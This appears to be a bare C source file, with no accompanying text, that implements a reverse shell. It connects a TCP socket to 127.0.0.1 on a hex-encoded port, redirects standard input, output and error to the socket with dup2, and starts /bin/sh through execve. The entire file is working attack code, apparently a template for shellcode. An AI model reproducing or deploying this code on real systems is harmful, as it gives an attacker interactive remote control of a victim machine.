#include <stdio.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>

void main(){
	int fd;
	fd = socket(2,1,0);
	struct sockaddr_in srv;

	srv.sin_family=2;
	srv.sin_port=htons(0xD304);
	srv.sin_addr.s_addr=inet_addr("127.0.0.1");
	connect(fd,(struct sockaddr*)&srv,16);

	for (int i = 0; i < 3; ++i)
	{
		dup2(fd,i);
	}
	execve("/bin/sh",NULL,NULL);
}